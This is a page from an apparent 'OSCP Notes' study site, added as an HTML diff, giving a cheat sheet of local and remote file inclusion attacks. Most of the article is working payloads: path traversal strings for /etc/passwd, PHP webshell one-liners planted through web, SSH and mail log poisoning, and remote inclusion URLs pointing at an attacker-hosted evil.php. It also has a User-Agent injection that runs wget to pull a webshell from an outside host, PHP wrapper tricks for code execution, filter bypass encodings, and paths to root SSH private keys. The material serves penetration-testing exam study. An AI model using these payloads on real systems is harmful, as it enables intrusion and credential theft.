@@ -1,0 +1,485 @@
+<!DOCTYPE html>
+
+<html>
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+
+		<!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>Local and Remote file inclusion | OSCP Notes</title>
+<meta name="generator" content="Jekyll v3.8.7" />
+<meta property="og:title" content="Local and Remote file inclusion" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="1 Local File inclusion linux: https://insecure-website.com/loadImage?filename=../../../etc/passwd windows ``` http://target.com/?page=c:\windows\system32\drivers\etc\hosts http://webserver:ip/index.html?../../../../../boot.ini" />
+<meta property="og:description" content="1 Local File inclusion linux: https://insecure-website.com/loadImage?filename=../../../etc/passwd windows ``` http://target.com/?page=c:\windows\system32\drivers\etc\hosts http://webserver:ip/index.html?../../../../../boot.ini" />
+<link rel="canonical" href="http://localhost:4000/2-web/LFI-RFI/" />
+<meta property="og:url" content="http://localhost:4000/2-web/LFI-RFI/" />
+<meta property="og:site_name" content="OSCP Notes" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-08-03T20:23:57+00:00" />
+<script type="application/ld+json">
+{"@type":"Article","url":"http://localhost:4000/2-web/LFI-RFI/","headline":"Local and Remote file inclusion","dateModified":"2020-08-03T20:23:57+00:00","datePublished":"2020-08-03T20:23:57+00:00","description":"1 Local File inclusion linux: https://insecure-website.com/loadImage?filename=../../../etc/passwd windows ``` http://target.com/?page=c:\\windows\\system32\\drivers\\etc\\hosts http://webserver:ip/index.html?../../../../../boot.ini","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/siteicon.png"}},"@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+		<link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="OSCP Notes" />
+
+		<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Merriweather:400,400italic,700,700italic|Open+Sans:400,400italic,600,600italic,700,700italic|Inconsolata:400,700">
+		<link rel="stylesheet" href="/css/main.css">
+		<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+		<link rel="icon" type="image/png" href="/touch-icon.png" sizes="192x192">
+		<link rel="icon" type="image/png" href="/images/favicon.png">
+
+		
+	</head>
+
+	<body>
+		<header>
+			<h1>
+				<a href="/"><img src="/images/emblem.svg" width="40" height="40" alt="OSCP Notes logo"></a>
+				OSCP Notes
+				<button type="button" class="open-nav" id="open-nav"></button>
+			</h1>
+
+			<form action="/search/" method="get">
+				<input type="text" name="q" id="search-input" placeholder="Search" autofocus>
+				<input type="submit" value="Search" style="display: none;">
+			</form>
+
+			<nav class="full-navigation">
+				<ul>
+					<li class="nav-item top-level ">
+						
+						<a href="/">Hack The Planet</a>
+					</li>
+				</ul>
+
+				<ul>
+					
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/0-basics/1-network-basics/">basics</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/0-basics/1-network-basics/">network basics</a></li>
+								
+									<li class="nav-item "><a href="/0-basics/2-metasploit-basics/">metasploit basics</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/1-recon-enum/1-0-passive-recon/">enum</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/1-recon-enum/1-0-passive-recon/">passive recon</a></li>
+								
+									<li class="nav-item "><a href="/1-recon-enum/1-1-port-scanning-server-side-enumeration/">PORT SCANNING</a></li>
+								
+									<li class="nav-item "><a href="/1-recon-enum/1-3-common-ports/">COMMON PORTS</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level current">
+							
+							<a href="/2-web/0-initial-enumeration/">web</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/2-web/0-initial-enumeration/">initial methodology</a></li>
+								
+									<li class="nav-item current"><a href="/2-web/LFI-RFI/">Local and Remote file inclusion</a></li>
+								
+									<li class="nav-item "><a href="/2-web/cms/">CMSs</a></li>
+								
+									<li class="nav-item "><a href="/2-web/command-injection/">command injection</a></li>
+								
+									<li class="nav-item "><a href="/2-web/csrf/">CSRF</a></li>
+								
+									<li class="nav-item "><a href="/2-web/sqli/">SQL Injections</a></li>
+								
+									<li class="nav-item "><a href="/2-web/ssl/">ssl</a></li>
+								
+									<li class="nav-item "><a href="/2-web/ssrf/">ssrf</a></li>
+								
+									<li class="nav-item "><a href="/2-web/upload-bypass/">upload-bypass</a></li>
+								
+									<li class="nav-item "><a href="/2-web/verb-tampering/">verb tampering</a></li>
+								
+									<li class="nav-item "><a href="/2-web/xee/">XXE</a></li>
+								
+									<li class="nav-item "><a href="/2-web/xss/">XSS</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/3-Exploiting/1-webshells/">exploiting</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/3-Exploiting/1-webshells/">webshells</a></li>
+								
+									<li class="nav-item "><a href="/3-Exploiting/2-shellcodes-compiling-deploying/">shellcodes , compiling and deploying</a></li>
+								
+									<li class="nav-item "><a href="/3-Exploiting/3-bypassing-AV/">bypassing AV</a></li>
+								
+									<li class="nav-item "><a href="/3-Exploiting/4-databases/">databases</a></li>
+								
+									<li class="nav-item "><a href="/3-Exploiting/6-reverse-shells/">Reverse Shells</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/4-win-privesc/1-initial/">win privesc</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/4-win-privesc/1-initial/">initial</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/10-always-install-elevated/">always install elevated</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/11-secondary-logon-ms16-032/">secondary logon handle</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/12-insecure-registry/">insecure registry permissions</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/13-intel-sysret/">intel sysret</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/14-runas/">runas</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/15-LFI-FILES/">LFI files</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/16-UAC/">UAC bypass</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/17-llmnr/">LLMNR and NBT-NS poisoning</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/2-stored-credentials/">stored credentials</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/3-kernel/">Kernel Vulns</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/4-dll-injection/">DLL Injection</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/5-weak-service-permissions/">weak services</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/6-dll-hijacking/">DLL hijacking</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/7-potato/">POTATOS</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/8-group-policies-preferences/">group policy preferences</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/9-unquoted-service-path/">unquoted service path</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/5-linux-privesc/4-2-linux-privesc/">linux privesc</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/5-linux-privesc/4-2-linux-privesc/">linux privesc</a></li>
+								
+									<li class="nav-item "><a href="/5-linux-privesc/lin-security/">lin-security + GTFO bins</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/6-post-exploitation/4-0-windows-file-transfer/">post exploitation</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/6-post-exploitation/4-0-windows-file-transfer/">windows file transfer</a></li>
+								
+									<li class="nav-item "><a href="/6-post-exploitation/4-3-passwords+hash_attacks/">passwords attacks</a></li>
+								
+									<li class="nav-item "><a href="/6-post-exploitation/4.4-pivoting+tunneling/">pivoting+tunneling</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/7-varios/tips/">varios</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/7-varios/tips/">tips</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/8-cheatsheets/msfvenom/">cheatsheets</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/8-cheatsheets/msfvenom/">msfvenom</a></li>
+								
+									<li class="nav-item "><a href="/8-cheatsheets/nmap/">nmap</a></li>
+								
+									<li class="nav-item "><a href="/8-cheatsheets/powershell/">powershell</a></li>
+								
+									<li class="nav-item "><a href="/8-cheatsheets/tmux/">tmux</a></li>
+								
+							</ul>
+						</li>
+					
+				</ul>
+
+				<ul>
+					<li class="nav-item top-level ">
+						
+						<a href="/changelog/"></a>
+					</li>
+				</ul>
+			</nav>
+		</header>
+
+		<section class="main">
+			<div class="page-header">
+				<h2>web</h2>
+				<h3>Local and Remote file inclusion</h3>
+			</div>
+			<article class="content">
+				<h1 id="1-local-file-inclusion">1 Local File inclusion</h1>
+<hr />
+<ul>
+  <li>linux:
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    https://insecure-website.com/loadImage?filename=../../../etc/passwd
+</code></pre></div>    </div>
+  </li>
+  <li>windows
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://target.com/?page=c:\windows\system32\drivers\etc\hosts
+http://webserver:ip/index.html?../../../../../boot.ini
+
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<h3 id="log-poisoning">Log Poisoning</h3>
+
+<ul>
+  <li>web log poisoning
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc 10.10.10.14 80
+&lt;?php echo '&lt;pre&gt;' . shell_exec($_GET['cmd'])  . '&lt;/pre&gt;'; ?&gt;
+</code></pre></div>    </div>
+  </li>
+  <li><strong>linux</strong>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://10.10.0.1/addguestbook.php?name=Test&amp;comment=Which+lang%3F&amp;cmd=ipconfig&amp;LANG=../../../../../../../xampp/apache/logs/access.log%00&amp;Submit=Submit
+</code></pre></div>    </div>
+  </li>
+  <li><strong>windows</strong>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://10.10.10.14/menu.php?file=c:\xamp\apache\logs\access.log&amp;cmd=ls
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<h3 id="ssh-log-posioning">SSH log posioning</h3>
+<p>http://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/</p>
+
+<h3 id="mail-log">Mail log</h3>
+<p>LFI /var/mail/<user></user></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>telnet &lt;IP&gt; 25  
+EHLO &lt;random character&gt;  
+
+VRFY &lt;user&gt;@localhost  
+
+mail from:attacker@attack.com  
+rcpt to: &lt;user&gt;@localhost  
+data  
+
+Subject: title  
+
+&lt;?php echo system($_REQUEST[cmd]); ?&gt;  
+
+&lt;end with .&gt;  
+
+</code></pre></div></div>
+
+<h1 id="2-remote-file-inclusion">2 Remote File Inclusion</h1>
+<hr />
+
+<p>requires allow_url_fopen=On and allow_url_include=On</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+$incfile = $_REQUEST["file"];  
+include($incfile.".php");  
+
+</code></pre></div></div>
+
+<ul>
+  <li><strong>original</strong>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.0.1/addguestbook.php?name=Test&amp;comment=Which+lang%3F&amp;LANG=FR&amp;Submit=Submit
+</code></pre></div>    </div>
+  </li>
+  <li><strong>modificado</strong>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.0.1/addguestbook.php?name=Test&amp;comment=Which+lang%3F&amp;LANG=http://10.10.10.10./evil.php&amp;Submit=Submit
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<p>seguro nos tira un problema  tratando de ejecutar evil.txt.php, asi que podemos usar un nullbyte para que no appenda el .php</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.0.1/addguestbook.php?name=Test&amp;comment=Which+lang%3F&amp;LANG=http://10.10.10.10./evil.php%00&amp;Submit=Submit
+</code></pre></div></div>
+
+<h2 id="web-shell-rfi">web shell rfi</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat shell.php
+&lt;?=`$_GET[0]`?&gt;
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.10.151/blog/?lang=//10.10.14.23/Public/shell.php&amp;0=dir
+</code></pre></div></div>
+
+<h1 id="3-common-obstacules">3 Common obstacules</h1>
+<hr />
+<ul>
+  <li>just the path
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    filename=/etc/passwd
+</code></pre></div>    </div>
+  </li>
+  <li>stripped non recursive
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>filename=....//....//....//etc/passwd
+</code></pre></div>    </div>
+  </li>
+  <li>encoding
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> filename=..%252f..%252f..%252fetc/passwd
+</code></pre></div>    </div>
+  </li>
+  <li>validation of start path
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> filename=/var/www/images/../../../etc/passwd
+</code></pre></div>    </div>
+  </li>
+  <li>add nullbyte
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> filename=..%252f..%252f..%252fetc/passwd%00
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<h1 id="4-common-lfi-to-rce">4 common LFI to RCE</h1>
+<hr />
+
+<h2 id="1-using-file-upload-formsfunctions">1. Using file upload forms/functions</h2>
+<p>upload a shell,  then</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://example.com/index.php?page=path/to/uploaded/file.php
+</code></pre></div></div>
+
+<h2 id="2-using-the-php-wrapper-expectcommand">2. Using the PHP wrapper expect://command</h2>
+<p>if the app use an include:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php  
+include $_GET['page'];  
+?&gt;  
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://target.com/index.php?page=expect://whoami  
+</code></pre></div></div>
+<h2 id="3-using-php-wrapper-file">3. Using php wrapper file://</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://localhost/include.php?page=file:///path/to/file.ext
+</code></pre></div></div>
+<h2 id="4-using-the-php-wrapper-phpfilter">4. Using the PHP wrapper php://filter</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://localhost/include.php?page=php://filter/convert.base64-encode/resource=secret.inc
+http://localhost/include.php?page=php://filter/read=convert.base64-encode/resource=secret.inc
+http://localhost/include.php?page=php://filter/resource=/etc/passwd
+</code></pre></div></div>
+<h2 id="5-using-php-input-stream">5. Using PHP input:// stream</h2>
+<p>POST</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/fi/?page=php://input&amp;cmd=ls
+</code></pre></div></div>
+<h2 id="6-using-datatextplainbase64command">6. Using data://text/plain;base64,command</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>data://text/plain;base64,[command encoded in base64]
+or
+data://text/plain,&lt;?php shell_exec($_GET['cmd']);?&gt;  
+</code></pre></div></div>
+<p>ex:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://example.com/Keeper.php?page=data://text/plain;base64,JTNDJTNGc3lzdGVtJTI4JTI3aWQlMjclMjklM0IlM0YlM0U=  
+http://example.com/Keeper.php?page=data://text/plain,&lt;?system('id');?&gt;  
+</code></pre></div></div>
+<h2 id="7-using-procselfenviron">7. Using /proc/self/environ</h2>
+<p>Another popular technique is to manipulate the Process Environ file. In a nutshell, when a process is created and has an open file handler then a file descriptor will point to that requested file.</p>
+
+<p>Our main target is to inject the /proc/self/environ file from the HTTP Header: User-Agent. This file hosts the initial environment of the Apache process. Thus, the environmental variable User-Agent is likely to appear there.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://secureapplication.example/index.php?view=../../../proc/self/environ
+</code></pre></div></div>
+<p>response:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP_USER_AGENT="curl/" &lt;/body&gt;
+</code></pre></div></div>
+<p>so we can inject shit like a webshell</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -H "User-Agent: &lt;?php system('wget http://10.10.14.6/webshell.php -O webshell.php')" http://target.com
+
+curl http://target.com/webshell.php&amp;cmd=ls
+
+</code></pre></div></div>
+
+<h2 id="8-using-procselffd">8. Using /proc/self/fd</h2>
+<p>brute force the fd until you see “referer”
+/proc/self/fd/{number}
+then</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -H "Referer: &lt;?php phpinfo(); ?&gt;" http://target.com
+</code></pre></div></div>
+
+<h2 id="9-using-zip">9. Using zip</h2>
+<p>Upload a ZIP file containing a PHP shell compressed and access:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
+</code></pre></div></div>
+<h2 id="10-using-log-files-with-controllable-input-like">10. Using log files with controllable input like:</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  . /var/log/apache/access.log
+  . /var/log/apache/error.log
+  . /var/log/vsftpd.log
+  . /var/log/sshd.log
+  . /var/log/mail
+</code></pre></div></div>
+
+<h1 id="5-common-files-location">5 Common files location</h1>
+<hr />
+
+<p>https://wiki.apache.org/httpd/DistrosDefaultLayout<br />
+<strong>Common log file location</strong><br />
+<strong>Ubuntu, Debian</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/var/log/apache2/error.log  
+/var/log/apache2/access.log  
+</code></pre></div></div>
+<p><strong>Red Hat, CentOS, Fedora, OEL, RHEL</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/var/log/httpd/error_log  
+/var/log/httpd/access_log  
+</code></pre></div></div>
+<p><strong>FreeBSD</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/var/log/httpd-error.log  
+/var/log/httpd-access.log  
+</code></pre></div></div>
+<p><strong>Common Config file location</strong></p>
+
+<p>check any restriction or hidden path on accessing the server</p>
+
+<p><strong>Ubuntu</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/etc/apache2/apache2.conf  
+/etc/apache2/httpd.conf  
+/etc/apache2/apache2.conf  
+/etc/httpd/httpd.conf  
+/etc/httpd/conf/httpd.conf  
+</code></pre></div></div>
+<p><strong>FreeBSD</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/local/etc/apache2/httpd.conf  
+
+Hidden site?  
+/etc/apache2/sites-enabled/000-default.conf  
+</code></pre></div></div>
+
+<p><strong>root/user ssh keys? .bash_history?</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/root/.ssh/id_rsa
+/root/.ssh/id_rsa.keystore
+/root/.ssh/id_rsa.pub
+/root/.ssh/authorized_keys
+/root/.ssh/known_hosts
+</code></pre></div></div>
+<h1 id="resources">Resources</h1>
+<p>https://www.php.net/manual/en/wrappers.file.php</p>
+
+			</article>
+		</section>
+
+		<script>
+			document.getElementById("open-nav").addEventListener("click", function () {
+				document.body.classList.toggle("nav-open");
+			});
+		</script>
+	</body>
+</html>
